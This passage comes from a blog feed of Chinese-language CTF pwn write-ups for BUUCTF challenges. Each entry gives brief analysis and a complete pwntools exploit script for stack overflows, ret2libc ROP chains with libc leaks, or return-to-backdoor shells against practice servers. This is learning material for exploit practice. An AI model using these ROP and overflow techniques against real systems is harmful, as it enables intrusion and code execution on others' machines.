class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(binsh)</span><br><span class="line">p.sendline(pay2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><h2 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h2><p>32位开NX泄露libc</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081045150.png" alt="image-20230808104509112"></p>
<p>注意get_n是自定义函数</p>
<p>规定读入v2长度的字符，但是程序要求v2不大于32。观察到int型的v2传入unsigned int型的a2，可以传入-1整数溢出绕过。</p>
<p>ROP链泄露libc，溢出覆盖返回地址getshell</p>
<h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn0&#x27;) </span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26602</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;How many bytes do you want me to read?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn0&#x27;</span>) </span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">plt_addr  = elf.plt[<span class="string">&#x27;printf&#x27;</span>]	</span><br><span class="line">got_addr  = elf.got[<span class="string">&#x27;getchar&#x27;</span>]</span><br><span class="line">fmt = <span class="number">0x080486F</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#第一行的才正确？</span></span><br><span class="line">pay1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(plt_addr)+p32(main_addr)+p32(fmt)+p32(got_addr)</span><br><span class="line"><span class="comment">#pay1 = b&#x27;a&#x27;*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)+p32(fmt)</span></span><br><span class="line"><span class="comment">#pay1 = b&#x27;a&#x27;*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getchar_addr= u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="comment">#getchar_addr = u32(p.recv()[0:4])变成接收前面四个字节了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;getchar_addr = &quot;</span>,<span class="built_in">hex</span>(getchar_addr))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc=LibcSearcher(&#x27;getchar&#x27;,getchar_addr)</span></span><br><span class="line"><span class="string">offset=getchar_addr-libc.dump(&#x27;getchar&#x27;)</span></span><br><span class="line"><span class="string">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="string">system=offset+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">base_addr = getchar_addr - libc.symbols[<span class="string">&#x27;getchar&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + base_addr</span><br><span class="line">binsh = libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__() + base_addr</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base_addr = &quot;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line"><span class="comment">#print(&quot;libc_base_addr = &quot;,hex(offset))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys_addr = &quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sh_addr = &quot;</span>,<span class="built_in">hex</span>(binsh))</span><br><span class="line">pay2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(binsh)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;How many bytes do you want me to read?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(pay2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><h2 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h2><p>64位，与32位传参有区别</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072310866.png" alt="image-20230807231036816"></p>
<p>思路：</p>
<ol>
<li>利用puts函数泄露出puts函数真实地址</li>
<li>通过puts函数地址计算出libc基地址，从而计算出system和binsh的真实地址</li>
<li>构造rop链栈溢出getshell</li>
</ol>
<p>puts函数通过pop rdi ; ret 传参</p>
<p>用ROPgadget可以找到</p>
<h2 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"> </span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">	<span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">		p = process(<span class="string">&#x27;./pwn&#x27;</span>) </span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29917</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#elf</span></span><br><span class="line">	main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">	plt_addr  = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	got_addr  = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	pop_rdi   = <span class="number">0x0400733</span></span><br><span class="line">	ret_addr  = <span class="number">0x04004c9</span></span><br><span class="line">	</span><br><span class="line">	payload   = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#libc</span></span><br><span class="line">	lib 	        = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr) </span><br><span class="line">	lib_puts_addr   = lib.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">	lib_system_addr = lib.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">	lib_bin_addr    = lib.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#base</span></span><br><span class="line">	base_addr       = puts_addr - lib_puts_addr</span><br><span class="line">	system_addr	= base_addr + lib_system_addr</span><br><span class="line">	bin_addr	= base_addr + lib_bin_addr</span><br><span class="line">	payload		= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(ret_addr) + p64(pop_rdi) + p64(bin_addr) + p64(system_addr)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	</span><br><span class="line">	p.interactive()</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>64位的ret2libc3</p>
<h2 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h2><p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308080953982.png" alt="image-20230808095301880"></p>
<p>利用printf泄露libc版本和基地址，传参的时候需要传入格式化字符串%s给寄存器rdi（程序中第二个printf函数自带，返回至该格式化字符串地址即可）；并将想要泄露的read_got传给寄存器。</p>
<h2 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25502</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#一定要用题目给的libc文件，可能必须要用题目给的才能打通</span></span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400731</span></span><br><span class="line">fmt = <span class="number">0x0000000000400790</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(fmt)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name? &quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;read_addr ======&gt;&gt; &quot;</span>+<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_base = read_addr -  libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>retlibc合集</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>week1 T2</title>
    <url>/posts/ca38ece3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-rip"><a href="#T2-rip" class="headerlink" title="T2 rip"></a>T2 rip</h2><blockquote>
<p>2023-01-04WP<br>BUUCTF pwn第二题<br>考点：简单的栈溢出</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><p>查看保护机制<br><img data-src="https://pic2.zhimg.com/80/v2-58b53c6902894211862d4148de61eaa1_1440w.webp"><br>啥都没开，非常nice</p>
<h3 id="0x02-IDA"><a href="#0x02-IDA" class="headerlink" title="0x02 IDA"></a>0x02 IDA</h3><p>file后是64位，扔到IDA里<br><img data-src="https://pic4.zhimg.com/80/v2-7006f2599ec061a9ccd9e41370a2c34b_1440w.webp"><br>打开string window,发现有&#x2F;bin&#x2F;sh，双击-》点击command,ctrl+X跳到fun函数里<br><del>Function window直接找也行….</del><br><img data-src="https://pic2.zhimg.com/80/v2-42111c4151f4950164f04d213c23e9bd_1440w.webp"><br>直接f5大法<br>main函数里好像没啥用<br>看到char了一个s数组还有get函数，栈溢出无疑了<br><img data-src="https://pic3.zhimg.com/80/v2-21033c9a0be0c615a751be12c50d7a6a_1440w.webp"><br>fun函数里有system函数，想到把fun函数的地址压进栈的return address里使fun函数得以执行<br>于是找出fun函数中调用system的地址0x40118A<br><img data-src="https://pic2.zhimg.com/80/v2-23ce5525745d5b11353c4a0c792f0edd_1440w.webp"><br>有了地址，现在需要知道的是s的长度，在IDA中可以找到<br><img data-src="https://pic1.zhimg.com/80/v2-a94f13524837503afef423f2bcea458c_1440w.webp"><br>距离rbp的距离是0Fh，也就是s的内存空间为15字节,当然了，除此之外，还需要8字节的数据将rbp填满，才能让数据溢过Local Variables 和 Caller’s rsp，溢出进入Return Address</p>
<h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>vim pwn1.py<br><code>#pwn1.py from pwn import * p = remote(&quot;node4 .buuoj.cn&quot;,25026) payload = b&#39;a&#39; * (0xf+8) + p64(0x40118A) p.sendline(payload) p.interactive() </code><br><del>一开始没加b’’然后报错TypeError: can only concatenate str (not “bytes”) to str……</del><br>执行脚本得到flag<br><img data-src="https://pic2.zhimg.com/80/v2-8cf32a5f0007c9057c530f3e4be55c6d_1440w.webp"></p>
<h3 id="0x04-补充一些知识"><a href="#0x04-补充一些知识" class="headerlink" title="0x04 补充一些知识"></a>0x04 补充一些知识</h3><p>IDA栈帧视窗详细说明：<a href="https://blog.csdn.net/u012206617/article/details/87717310">这篇文章</a><br><a href="https://blog.csdn.net/ComputerInBook/article/details/126840323">这篇文章</a>举了一个例子详细说明</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week1 T4</title>
    <url>/posts/235b49d6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ciscn-2019-n-1"><a href="#T4-ciscn-2019-n-1" class="headerlink" title="T4 ciscn_2019_n_1"></a>T4 ciscn_2019_n_1</h2><blockquote>
<p>2023-01-08WP<br>BUUCTF pwn第四题</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>先<strong>file，chekcsec</strong>——64-bit，开启<strong>NX</strong><br><img data-src="https://pic2.zhimg.com/80/v2-fcbfe99feb2a92abc72a297e219777e9_1440w.webp"></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>中main函数没啥有用的，看到还有一个fun函数<br><img data-src="https://pic2.zhimg.com/80/v2-ba42478d6dfc7d2b91ba248e835a4429_1440w.webp"><br>点进去看发现有个gets函数，可能存在栈溢出，同时发现if ( v2 &#x3D;&#x3D; 11.28125 )时调用system函数，所以想到输入来使v2的值等于11.28125<br>但是gets读入的时v1而不是v2，所以又想到让v1溢出，使溢出的值为11.28125并让它成为v2的值<br>于是进去查看v1v2的地址<br><img data-src="https://pic3.zhimg.com/80/v2-f9dc01951802e4c151cf6ddd0fdd1eee_1440w.webp"><br><img data-src="https://pic4.zhimg.com/80/v2-f90e4938ab553be25f298598c50e7d03_1440w.webp"><br>计算得长度为44h</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>exp</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,25907)</span><br><span class="line">payload=b&quot;a&quot;*44+p64(0x41348000)#0x41348000是11.28125的十六进制数</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()          </span><br></pre></td></tr></table></figure>
<p><del>直接写11.28125好像没用……</del><br><img data-src="https://pic1.zhimg.com/80/v2-c5edce340e57ef721fc68134243ee168_1440w.webp"><br>网上看到一篇<a href="https://blog.csdn.net/qq_41560595/article/details/108783758">博客</a>是直接从IDA中找十六进制数的<br>pwn得flag<br>还有一种方法就是直接覆盖v1v2，让返回地址指向调用system函数的地址0x4006BE<br><img data-src="https://pic4.zhimg.com/80/v2-cf387e39d529bbf5bdf92c02f6064f97_1440w.webp"><br>这就让我有<strong>一些疑惑：</strong>就这一题来说，开启了NX有没有让题目难度增加呢？</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week1 T3</title>
    <url>/posts/bd3fdc75/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-warmup-csaw-2016"><a href="#T3-warmup-csaw-2016" class="headerlink" title="T3 warmup_csaw_2016"></a>T3 warmup_csaw_2016</h2><blockquote>
<p>2023-01-06WP<br>BUUCTF pwn第三题<br>考点：栈溢出，与上题类似</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><p>下载文件，没有开启任何保护（看大佬博客里说按经验这种情况一般就是栈溢出了）<br><img data-src="https://pic1.zhimg.com/80/v2-fb4d58181e235c94561577b2c4af38dc_1440w.webp"></p>
<h3 id="0x02-IDA"><a href="#0x02-IDA" class="headerlink" title="0x02 IDA"></a>0x02 IDA</h3><p>f5反汇编，main函数里有一个gets()函数<br><img data-src="https://pic3.zhimg.com/80/v2-19fc3d1ed197677ec860d87f4d328756_1440w.webp"><br>看到返回一个gets()函数，可利用栈溢出<br><del>但是这个两个参数的gets函数没有看懂……</del><br><del>那个write和sprintf函数也没看懂……</del><br>shift+f12调出string window 查看字符串，虽然没有&#x2F;bin&#x2F;sh，但是找到了一个cat flag.txt，应该可以利用<br><img data-src="https://pic1.zhimg.com/80/v2-a9342c39cccfcb08151c10e52d33d7f8_1440w.webp"><br>双击cat flag.txt进去看看，X一下发现是在sub_40060D函数里，反汇编再看一下发现我们想要的system（）就在这，若能调用它的话就能直接命令抓取flag了呀<br><img data-src="https://pic3.zhimg.com/80/v2-8439007eace8a199836ffba7ed7ae65e_1440w.webp"><br><img data-src="https://pic3.zhimg.com/80/v2-f6878b5ead1b0c9e36cf46e11b1b73c2_1440w.webp"><br>接下来就是记下sub_40060D函数的地址0x40060D,并将其作为溢出的返回地址（也可以记把偏移量压入寄存器那条汇编指令处的地址0x40011）<br><img data-src="https://pic1.zhimg.com/80/v2-ea795c3163730c1428cdeb16c15eabfc_1440w.webp"><br>又因为要gets的v5的大小为0x40h，所以与返回地址的距离是0x40+8（rbp的长度）<br><img data-src="https://pic3.zhimg.com/80/v2-78a46c31edfbcab05ff353e3e624996a_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-feaba2ae58e8a0cf0161837933d1fe29_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-244c60af51681873d600771f879d5c00_1440w.webp"></p>
<h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>写出exploit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,25916)</span><br><span class="line">payload=&#x27;a&#x27;*(0x40+8)+p64(0x400611)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到flag<br><img data-src="https://pic4.zhimg.com/80/v2-e3375ccc43536a0178b679606bfaa1eb_1440w.webp"></p>
<h3 id="0x04-thinking"><a href="#0x04-thinking" class="headerlink" title="0x04 thinking"></a>0x04 thinking</h3><p>这题跟上一题一样，都是栈溢出，都是将某个后门函数的地址覆盖掉返回地址<br>一开始没反应过来cat flag.txt可以直接用，还在那找&#x2F;bin&#x2F;sh,<br>还是对信息不太敏感……<br>不过对栈的相关知识的学习还是让人感觉有收获的</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week1 T1</title>
    <url>/posts/5331bd59/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T1-test-your-nc"><a href="#T1-test-your-nc" class="headerlink" title="T1 test_your_nc"></a>T1 test_your_nc</h2><blockquote>
<p>2023-01-03WP<br>BUUCTF pwn第一题</p>
</blockquote>
<span id="more"></span>

<h3 id="一、用checksec检测文件保护机制"><a href="#一、用checksec检测文件保护机制" class="headerlink" title="一、用checksec检测文件保护机制"></a>一、用checksec检测文件保护机制</h3><p>下载文件，checksec得知已开启NX保护<br><img data-src="https://pic2.zhimg.com/80/v2-e67d3c6a1857cc38c34efd40ed29e80d_1440w.webp"><br>（奇怪的是checksec没有给出文件位数，后来还是file了一下得到是64位）</p>
<h3 id="二、打开IDA"><a href="#二、打开IDA" class="headerlink" title="二、打开IDA"></a>二、打开IDA</h3><p>将文件扔到IDA中，按下shift+f12,打开string window，发现&#x2F;bin&#x2F;sh<br><img data-src="https://pic4.zhimg.com/v2-fbe627c7dd17761ef3bc56360d884f27_r.jpg"><br>双击&#x2F;bin&#x2F;sh，点击command，交叉引用快捷键X，发现地址在main函数里<br><img data-src="https://pic1.zhimg.com/80/v2-84f08756aa27af34ed8fa47762094234_1440w.webp"><br>按下f5确定main函数就是一个简单地调用了&#x2F;bin&#x2F;sh的system函数<br><img data-src="https://pic2.zhimg.com/80/v2-06f1ca937f2820c16be174944ebde851_1440w.webp"><br><del>(其实感觉前两步就这题来说没必要……但是看一篇博客说拿到文件先checksec一下再IDA一下于是想试一下……)</del></p>
<h3 id="三、结合题目提示可知直接nc"><a href="#三、结合题目提示可知直接nc" class="headerlink" title="三、结合题目提示可知直接nc"></a>三、结合题目提示可知直接nc</h3><p><del>（这个地方一开始报错，仔细一看发现ctrl cv过来的端口那里还有一个：得把冒号去掉……）</del><br>ls列出文件目录<br><img data-src="https://pic4.zhimg.com/80/v2-d117911f69f0b5cdc99a9a7c5352489b_1440w.webp"><br>发现flag，用cat（concatenate，命令用于连接文件并打印到标准输出设备上）抓取flag得<br><img data-src="https://pic2.zhimg.com/80/v2-c7068e97c98c8f0dc5a292df9ab746cd_1440w.webp"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week1 T5</title>
    <url>/posts/545c7940/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-pwn1-sctf-2016"><a href="#T5-pwn1-sctf-2016" class="headerlink" title="T5 pwn1_sctf_2016"></a>T5 pwn1_sctf_2016</h2><blockquote>
<p>2023-01-09WP<br>BUUCTF pwn第五题</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit,开启NX<br><img data-src="https://pic3.zhimg.com/80/v2-746f7f97d1877dc7901815486c36d846_1440w.webp"></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>中shift+f12可以找到有个cat flag.txt<br><img data-src="https://pic1.zhimg.com/80/v2-9d38aa862b9408f86802c4dca80493a4_1440w.webp"><br>可以利用这个函数来输出flag<br>查看调用它的函数并记下它的地址0x8048F0D<br><img data-src="https://pic3.zhimg.com/v2-107e624689b731fc197a5f737bac2106_r.jpg"><br>继续寻找能够溢出的函数，在main函数中的vuln函数里有fget()函数<br><img data-src="https://pic3.zhimg.com/80/v2-fc51095b6ef69a5c78254f87a3dcea9a_1440w.webp"><br>但是fget函数限制了输入长度为32，好像并不能构成栈溢出<br>于是我就蒙了，fget后面的伪代码又不是看得很懂……<br>查了许多大概理解了是后面的replace函数将一个字节的i换成了三个字节的you<br>这样一来我们只需要输入20个‘I’，replace后就会变成60个字节的‘you’,这样就能填满长度为0x3Ch的s<br>payload再覆盖掉ebp再加上get_flag函数的地址就可以了<br>最后看大佬博客半懂半不懂地写了个exp<br>（这篇<a href="https://www.freebuf.com/vuls/336623.html">博客</a>感觉算是比较详细的，它甚至是直接分析汇编语言）</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;, 28105)</span><br><span class="line">flag_addre = 0x08048F0D</span><br><span class="line">payload = b&#x27;I&#x27;*0x14+b&#x27;aaaa&#x27;+p32(flag_addre)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>还是不是很懂到底是怎么看出来是把i换成you的<br>还有就是这个replace函数的参数列表中那个v4代表的是什么<br><img data-src="https://pic3.zhimg.com/80/v2-cc78aea540c7bae381b3cfe547853dae_1440w.webp"><br>并没有在v4这里写入i或者you呀，这猜都不好猜是把i换成you了<br><del>直接点进去看replace的源码好像又不科学，根本看不懂……</del><br>补充：C++的伪代码就是比较难看，不能只看IDA了，要结合gdb调试去猜i换成you的替换</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week2 T1</title>
    <url>/posts/418412b7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T1-ret2text"><a href="#T1-ret2text" class="headerlink" title="T1 ret2text"></a>T1 ret2text</h2><blockquote>
<p>2023-01-09WP<br>ctf-wiki基础rop</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit， 开启NX<br><img data-src="https://pic3.zhimg.com/80/v2-20e95bd89f447f1d91529cc30f6128ce_1440w.webp"></p>
